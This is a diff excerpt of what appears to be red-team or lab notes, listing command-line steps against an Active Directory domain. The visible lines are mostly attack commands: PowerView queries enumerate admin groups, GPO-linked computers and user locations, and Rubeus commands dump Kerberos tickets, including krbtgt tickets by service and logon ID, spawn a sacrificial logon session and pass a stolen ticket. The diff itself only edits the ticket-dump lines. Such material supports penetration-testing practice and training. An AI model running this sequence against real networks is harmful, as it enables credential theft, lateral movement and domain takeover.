@@ -27,9 +27,9 @@ powershell Get-DomainGroupMember -identity 'Helpdesk\Admins' -recurse | select -
 powershell Get-DomainOU -GPLink '{66465373-16CB-4F96-BD3A-12AE7D2C2371}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
 powershell Find-DomainUserLocation -userIdentity 'Workstation\Admins'  
 execute-assembly C:\Users\Public\Rubeus.exe triage
+execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1c6be # krbtgt/insomnia.ninja along with LUID
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
-execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1b37e  
-execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
 execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x21d8e17 /ticket:[...snip...]
 
 ```
